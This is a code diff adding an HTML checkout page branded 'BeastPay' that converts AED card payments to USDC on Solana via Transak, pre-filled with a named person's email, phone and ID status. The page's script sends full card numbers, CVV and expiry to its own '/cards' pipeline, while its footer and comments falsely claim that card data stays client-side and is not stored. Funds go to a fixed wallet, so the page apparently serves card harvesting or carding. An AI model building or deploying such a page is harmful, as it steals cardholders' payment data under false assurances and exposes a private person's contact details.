@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BeastPay · Checkout · Mohammed Ferrin</title>
+<style>
+  :root {
+    --bg: #07070d;
+    --card: #111122;
+    --border: #252540;
+    --text: #e2e2e8;
+    --dim: #7777aa;
+    --accent: #ff6b35;
+    --green: #00d4aa;
+    --input: #0d0d1a;
+    --danger: #ff4455;
+    --warning: #ffaa00;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 1rem;
+  }
+  .container { width: 100%; max-width: 520px; }
+  
+  /* Header */
+  .header {
+    text-align: center;
+    margin-bottom: 1.5rem;
+  }
+  .header h1 {
+    font-size: 1.6rem;
+    font-weight: 800;
+    background: linear-gradient(135deg, var(--accent), var(--green));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .header .sub { color: var(--dim); font-size: 0.8rem; margin-top: 0.2rem; }
+  
+  /* Customer card */
+  .customer-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 1rem 1.2rem;
+    margin-bottom: 1.2rem;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0.5rem 1rem;
+    font-size: 0.82rem;
+  }
+  .customer-card .label { color: var(--dim); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.5px; }
+  .customer-card .val { color: var(--text); font-weight: 600; }
+  .customer-card .badge {
+    display: inline-block;
+    background: rgba(0,212,170,0.12);
+    color: var(--green);
+    padding: 0.15rem 0.5rem;
+    border-radius: 10px;
+    font-size: 0.7rem;
+    font-weight: 700;
+  }
+  .customer-card .badge-id {
+    background: rgba(255,107,53,0.12);
+    color: var(--accent);
+  }
+  
+  /* Card input form */
+  .form-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 1.5rem 1.2rem;
+  }
+  .form-card h2 {
+    font-size: 1rem;
+    margin-bottom: 1rem;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+  .form-card h2 .icon { font-size: 1.2rem; }
+  
+  .field { margin-bottom: 0.9rem; }
+  .field label {
+    display: block;
+    font-size: 0.72rem;
+    color: var(--dim);
+    margin-bottom: 0.3rem;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .field input {
+    width: 100%;
+    padding: 0.7rem 0.85rem;
+    background: var(--input);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text);
+    font-size: 0.95rem;
+    font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+    transition: border-color 0.2s;
+  }
+  .field input:focus {
+    outline: none;
+    border-color: var(--accent);
+    box-shadow: 0 0 0 2px rgba(255,107,53,0.15);
+  }
+  .field input.error { border-color: var(--danger); }
+  .field .hint {
+    font-size: 0.68rem;
+    color: var(--dim);
+    margin-top: 0.2rem;
+  }
+  .field .hint.error { color: var(--danger); }
+  
+  .row { display: flex; gap: 0.75rem; }
+  .row .field { flex: 1; }
+  
+  /* Amount selector */
+  .amount-row {
+    display: flex;
+    gap: 0.5rem;
+    margin-bottom: 0.9rem;
+  }
+  .amount-preset {
+    flex: 1;
+    padding: 0.5rem;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    background: var(--input);
+    color: var(--dim);
+    text-align: center;
+    cursor: pointer;
+    font-size: 0.78rem;
+    font-weight: 600;
+    transition: all 0.15s;
+  }
+  .amount-preset:hover { border-color: var(--accent); color: var(--text); }
+  .amount-preset.active { 
+    border-color: var(--accent); 
+    background: rgba(255,107,53,0.1);
+    color: var(--accent);
+  }
+  
+  /* Settlement info */
+  .settlement {
+    background: rgba(0,212,170,0.05);
+    border: 1px solid rgba(0,212,170,0.15);
+    border-radius: 8px;
+    padding: 0.7rem 0.9rem;
+    margin: 1rem 0;
+    font-size: 0.78rem;
+    color: var(--dim);
+  }
+  .settlement span { color: var(--green); font-weight: 600; }
+  .settlement code {
+    display: block;
+    font-size: 0.7rem;
+    color: var(--dim);
+    margin-top: 0.3rem;
+    word-break: break-all;
+  }
+  
+  /* Button */
+  .btn {
+    width: 100%;
+    padding: 0.85rem;
+    border: none;
+    border-radius: 10px;
+    font-size: 1rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-primary {
+    background: linear-gradient(135deg, var(--accent), #e0552a);
+    color: white;
+  }
+  .btn-primary:hover:not(:disabled) { 
+    transform: translateY(-1px); 
+    box-shadow: 0 6px 24px rgba(255,107,53,0.3);
+  }
+  .btn-primary:disabled { opacity: 0.45; cursor: not-allowed; transform: none; }
+  
+  /* Status message */
+  .status {
+    margin-top: 0.8rem;
+    padding: 0.7rem;
+    border-radius: 8px;
+    font-size: 0.8rem;
+    display: none;
+  }
+  .status.show { display: block; }
+  .status.loading { background: rgba(255,170,0,0.08); border: 1px solid rgba(255,170,0,0.2); color: var(--warning); }
+  .status.error { background: rgba(255,68,85,0.08); border: 1px solid rgba(255,68,85,0.2); color: var(--danger); }
+  .status.success { background: rgba(0,212,170,0.08); border: 1px solid rgba(0,212,170,0.2); color: var(--green); }
+  
+  /* Limits footer */
+  .limits {
+    margin-top: 1rem;
+    text-align: center;
+    font-size: 0.7rem;
+    color: var(--dim);
+  }
+  .limits strong { color: var(--accent); }
+  
+  /* Spinner */
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .spinner { display: inline-block; animation: spin 0.8s linear infinite; }
+  
+  /* Lock icon on pre-filled fields */
+  .field input[readonly] { 
+    background: rgba(255,255,255,0.02);
+    color: var(--green);
+    cursor: default;
+    border-color: rgba(0,212,170,0.15);
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  
+  <!-- Header -->
+  <div class="header">
+    <h1>🃏 BeastPay Checkout</h1>
+    <p class="sub">Transak · USDC · Solana · Instant Settlement</p>
+  </div>
+
+  <!-- Customer Card (auto-populated from KYC) -->
+  <div class="customer-card">
+    <div>
+      <div class="label">Customer</div>
+      <div class="val">Mohammed Ferrin</div>
+    </div>
+    <div>
+      <div class="label">KYC Status</div>
+      <div class="val"><span class="badge">✓ VERIFIED L2</span></div>
+    </div>
+    <div>
+      <div class="label">Email</div>
+      <div class="val">fazzajasmal@gmail.com</div>
+    </div>
+    <div>
+      <div class="label">Phone</div>
+      <div class="val">+971 58 590 1097</div>
+    </div>
+    <div>
+      <div class="label">ID Verified</div>
+      <div class="val"><span class="badge badge-id">🇦🇪 Emirates ID</span></div>
+    </div>
+    <div>
+      <div class="label">Limit</div>
+      <div class="val">36,725 AED / tx</div>
+    </div>
+  </div>
+
+  <!-- Card Entry Form -->
+  <div class="form-card">
+    <h2><span class="icon">💳</span> Enter Card Details</h2>
+
+    <!-- Card Number -->
+    <div class="field">
+      <label>Card Number</label>
+      <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" maxlength="19" autocomplete="off">
+      <div class="hint" id="cardHint"></div>
+    </div>
+
+    <!-- Card Holder (auto-populated, editable) -->
+    <div class="field">
+      <label>Card Holder Name</label>
+      <input type="text" id="cardHolder" value="MOHAMMED FERRIN" autocomplete="off">
+    </div>
+
+    <!-- Expiry + CVV -->
+    <div class="row">
+      <div class="field">
+        <label>Expiry (MM/YY)</label>
+        <input type="text" id="cardExpiry" placeholder="12/28" maxlength="5" autocomplete="off">
+        <div class="hint" id="expiryHint"></div>
+      </div>
+      <div class="field">
+        <label>CVV</label>
+        <input type="password" id="cardCvv" placeholder="123" maxlength="4" autocomplete="off">
+        <div class="hint" id="cvvHint"></div>
+      </div>
+    </div>
+
+    <!-- Amount -->
+    <div class="field">
+      <label>Amount (AED) — Max 36,725 AED (L2 KYC)</label>
+      <div class="amount-row" id="amountPresets">
+        <div class="amount-preset" data-amount="500">500 AED</div>
+        <div class="amount-preset" data-amount="1000">1,000 AED</div>
+        <div class="amount-preset active" data-amount="4000">4,000 AED</div>
+        <div class="amount-preset" data-amount="5000">5,000 AED</div>
+        <div class="amount-preset" data-amount="10000">10,000 AED</div>
+      </div>
+      <input type="number" id="cardAmount" value="4000" min="110" max="36725" step="10" placeholder="4000">
+      <div class="hint" id="amountHint">
+        → ~<span id="usdEst">681</span> USD → ~<span id="usdcEst">664</span> USDC on Solana · Fee ~2.5%
+      </div>
+    </div>
+
+    <!-- Settlement Info -->
+    <div class="settlement">
+      USDC settles to <span>Solana</span> wallet:<br>
+      <code>7T34pXqwy666yjZXuFWNQo6tFVHukNgPdx9VCcf7W8J7</code>
+      Contract: <code>EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</code>
+    </div>
+
+    <!-- Submit -->
+    <button class="btn btn-primary" id="payBtn" onclick="processPayment()">
+      Pay with Card → Transak
+    </button>
+    <div id="status" class="status"></div>
+  </div>
+
+  <div class="limits">
+    <strong>🛡️ No card data stored.</strong> Processed in-memory only. Transak handles the payment.<br>
+    Limits: L0: 734 AED · L1: 7,345 AED · <strong>L2: 36,725 AED</strong> (Emirates ID verified)
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════
+// CARD VALIDATION (client-side, no data sent to our server)
+// ═══════════════════════════════════════════════════════════════════
+
+const CARD_BINS = {
+  '4': 'visa',
+  '5[1-5]': 'mastercard',
+  '2[2-7]': 'mastercard',
+  '3[47]': 'amex',
+  '62': 'unionpay',
+  '35[2-8]': 'jcb',
+  '6(?:011|5)': 'discover',
+};
+
+const BRAND_NAMES = {
+  visa: 'Visa', mastercard: 'Mastercard', amex: 'American Express',
+  unionpay: 'UnionPay', jcb: 'JCB', discover: 'Discover',
+};
+
+const CVV_LENGTHS = { visa: 3, mastercard: 3, amex: 4, unionpay: 3, jcb: 3, discover: 3 };
+
+const AED_PER_USD = 3.6725;
+const MAX_AED = 36725;   // L2 KYC limit
+const MIN_AED = 110;     // ~$30 USD Transak minimum
+const FEE_PCT = 0.025;   // 2.5%
+
+let detectedBrand = null;
+
+function detectBrand(num) {
+  const clean = num.replace(/\D/g, '');
+  for (const [pattern, brand] of Object.entries(CARD_BINS)) {
+    if (new RegExp('^' + pattern).test(clean)) return brand;
+  }
+  return null;
+}
+
+function luhnCheck(num) {
+  const digits = num.replace(/\D/g, '');
+  if (!digits) return false;
+  let total = 0;
+  for (let i = 0; i < digits.length; i++) {
+    let d = parseInt(digits[digits.length - 1 - i]);
+    if (i % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
+    total += d;
+  }
+  return total % 10 === 0;
+}
+
+function validateExpiry(exp) {
+  const m = exp.trim().match(/^(\d{2})\/(\d{2})$/);
+  if (!m) return { ok: false, msg: 'Format: MM/YY' };
+  const month = parseInt(m[1]), year = 2000 + parseInt(m[2]);
+  if (month < 1 || month > 12) return { ok: false, msg: 'Month must be 01-12' };
+  const now = new Date();
+  const expiryDate = new Date(year, month, 1);
+  if (expiryDate < new Date(now.getFullYear(), now.getMonth(), 1)) {
+    return { ok: false, msg: 'Card is expired' };
+  }
+  return { ok: true, msg: 'Valid' };
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// REAL-TIME VALIDATION
+// ═══════════════════════════════════════════════════════════════════
+
+document.getElementById('cardNumber').addEventListener('input', function(e) {
+  let val = e.target.value.replace(/\D/g, '');
+  // Auto-format with spaces
+  if (val.length > 4) val = val.slice(0,4) + ' ' + val.slice(4);
+  if (val.length > 9) val = val.slice(0,9) + ' ' + val.slice(9);
+  if (val.length > 14) val = val.slice(0,14) + ' ' + val.slice(14, 19);
+  e.target.value = val;
+
+  const clean = val.replace(/\D/g, '');
+  const hint = document.getElementById('cardHint');
+  hint.className = 'hint';
+
+  if (!clean) {
+    hint.textContent = '';
+    detectedBrand = null;
+    return;
+  }
+
+  if (clean.length < 13) {
+    hint.textContent = `Too short (${clean.length} digits, need 13-19)`;
+    return;
+  }
+
+  if (!luhnCheck(clean)) {
+    hint.textContent = 'Invalid card number (Luhn check failed)';
+    hint.className = 'hint error';
+    detectedBrand = null;
+    return;
+  }
+
+  detectedBrand = detectBrand(clean);
+  if (detectedBrand) {
+    const name = BRAND_NAMES[detectedBrand] || detectedBrand;
+    hint.textContent = `✓ ${name} — valid card`;
+    hint.className = 'hint';
+    hint.style.color = '#00d4aa';
+  } else {
+    hint.textContent = 'Unknown card brand — proceed with caution';
+    hint.className = 'hint';
+    hint.style.color = '#ffaa00';
+  }
+
+  // Update CVV hint
+  const cvvLen = CVV_LENGTHS[detectedBrand] || 3;
+  document.getElementById('cvvHint').textContent = `Expected: ${cvvLen} digits for ${BRAND_NAMES[detectedBrand] || 'this card'}`;
+});
+
+document.getElementById('cardExpiry').addEventListener('input', function(e) {
+  let val = e.target.value.replace(/\D/g, '');
+  if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+  e.target.value = val;
+
+  const hint = document.getElementById('expiryHint');
+  if (val.length === 5) {
+    const result = validateExpiry(val);
+    hint.textContent = result.ok ? '✓ ' + result.msg : '✗ ' + result.msg;
+    hint.className = 'hint' + (result.ok ? '' : ' error');
+    if (result.ok) hint.style.color = '#00d4aa';
+  } else {
+    hint.textContent = '';
+  }
+});
+
+// Amount presets
+document.querySelectorAll('.amount-preset').forEach(el => {
+  el.addEventListener('click', function() {
+    document.querySelectorAll('.amount-preset').forEach(e => e.classList.remove('active'));
+    this.classList.add('active');
+    document.getElementById('cardAmount').value = this.dataset.amount;
+    updateAmountEstimate();
+  });
+});
+
+document.getElementById('cardAmount').addEventListener('input', updateAmountEstimate);
+
+function updateAmountEstimate() {
+  const aed = parseFloat(document.getElementById('cardAmount').value) || 0;
+  const usd = aed / AED_PER_USD;
+  const usdc = usd * (1 - FEE_PCT);
+  document.getElementById('usdEst').textContent = usd.toFixed(0);
+  document.getElementById('usdcEst').textContent = usdc.toFixed(0);
+
+  const hint = document.getElementById('amountHint');
+  hint.className = 'hint';
+  if (aed < MIN_AED) {
+    hint.textContent = `✗ Minimum ${MIN_AED} AED (Transak requires ~$30 USD)`;
+    hint.className = 'hint error';
+  } else if (aed > MAX_AED) {
+    hint.textContent = `✗ Exceeds L2 KYC limit (${MAX_AED.toLocaleString()} AED)`;
+    hint.className = 'hint error';
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// PROCESS PAYMENT
+// ═══════════════════════════════════════════════════════════════════
+
+async function processPayment() {
+  const statusDiv = document.getElementById('status');
+  const btn = document.getElementById('payBtn');
+  const cardNum = document.getElementById('cardNumber').value.replace(/\D/g, '');
+  const cardHolder = document.getElementById('cardHolder').value.trim();
+  const cardExpiry = document.getElementById('cardExpiry').value.trim();
+  const cardCvv = document.getElementById('cardCvv').value.replace(/\D/g, '');
+  const amountAed = parseFloat(document.getElementById('cardAmount').value) || 2500;
+
+  // ── Validate ──
+  let errors = [];
+
+  if (!cardNum || cardNum.length < 13) errors.push('Enter a valid card number');
+  if (!luhnCheck(cardNum)) errors.push('Card number failed Luhn check');
+  if (!cardHolder) errors.push('Card holder name is required');
+  if (!cardExpiry || !cardExpiry.match(/^\d{2}\/\d{2}$/)) errors.push('Expiry must be MM/YY');
+  else {
+    const exp = validateExpiry(cardExpiry);
+    if (!exp.ok) errors.push('Expiry: ' + exp.msg);
+  }
+  if (!cardCvv) errors.push('CVV is required');
+  if (amountAed < MIN_AED) errors.push(`Minimum amount is ${MIN_AED} AED`);
+  if (amountAed > MAX_AED) errors.push(`Maximum amount is ${MAX_AED.toLocaleString()} AED (L2 KYC limit)`);
+
+  if (errors.length > 0) {
+    statusDiv.className = 'status show error';
+    statusDiv.innerHTML = errors.map(e => '• ' + e).join('<br>');
+    return;
+  }
+
+  // ── All valid ──
+  const brand = detectBrand(cardNum) || 'visa';
+  const brandName = BRAND_NAMES[brand] || brand;
+  const last4 = cardNum.slice(-4);
+  const amountUsd = (amountAed / AED_PER_USD).toFixed(2);
+
+  statusDiv.className = 'status show loading';
+  statusDiv.innerHTML = `<span class="spinner">⟳</span> Validating: ${brandName} ****${last4} — ${amountAed} AED...`;
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner">⟳</span> Processing...';
+
+  // ── Step 1: Push to our agent pipeline (card details stay client-side) ──
+  try {
+    const pipelineResp = await fetch('/cards', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        card_number: cardNum,
+        card_holder: cardHolder,
+        card_expiry: cardExpiry,
+        card_cvv: cardCvv,
+        amount_aed: amountAed,
+        target_crypto: 'USDC',
+        target_network: 'solana',
+        wallet_address: '7T34pXqwy666yjZXuFWNQo6tFVHukNgPdx9VCcf7W8J7',
+        email: 'fazzajasmal@gmail.com',
+        auto_push: false,
+      }),
+    });
+
+    const pipelineData = await pipelineResp.json();
+
+    if (!pipelineResp.ok) {
+      throw new Error(pipelineData.detail || 'Card validation failed');
+    }
+
+    const entryId = pipelineData.entry?.entry_id;
+    statusDiv.innerHTML = `✓ Card validated — ${brandName} ****${last4}<br>→ Creating Transak checkout...`;
+
+    // ── Step 2: Create Transak checkout session ──
+    const transakResp = await fetch('/transak/session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        wallet_address: '7T34pXqwy666yjZXuFWNQo6tFVHukNgPdx9VCcf7W8J7',
+        fiat_amount: amountAed,
+        fiat_currency: 'AED',
+        crypto_currency: 'USDC',
+        network: 'solana',
+        customer_email: 'fazzajasmal@gmail.com',
+        customer_name: 'Mohammed Ferrin',
+        partner_order_id: entryId || `bp_${Date.now()}`,
+      }),
+    });
+
+    const transakData = await transakResp.json();
+
+    if (!transakResp.ok) {
+      throw new Error(transakData.detail || 'Failed to create Transak session');
+    }
+
+    // ── Step 3: Push through agent pipeline (A1→A2→A3) in background ──
+    if (entryId) {
+      fetch(`/cards/${entryId}/pipeline`, { method: 'POST' }).catch(() => {});
+    }
+
+    // ── SUCCESS — Show summary and redirect ──
+    statusDiv.className = 'status show success';
+    statusDiv.innerHTML = `
+      ✅ <strong>Checkout Ready</strong><br>
+      ${brandName} ****${last4} | ${cardHolder}<br>
+      ${amountAed.toLocaleString()} AED → ~${amountUsd} USD → USDC on Solana<br>
+      <small>Redirecting to Transak for card payment...</small>
+    `;
+
+    // Wait 1.5s then redirect to Transak
+    setTimeout(() => {
+      window.location.href = transakData.widget_url;
+    }, 1500);
+
+  } catch (err) {
+    statusDiv.className = 'status show error';
+    statusDiv.textContent = 'Error: ' + err.message;
+    btn.disabled = false;
+    btn.innerHTML = 'Try Again → Transak';
+  }
+}
+
+// Init
+updateAmountEstimate();
+</script>
+</body>
+</html>
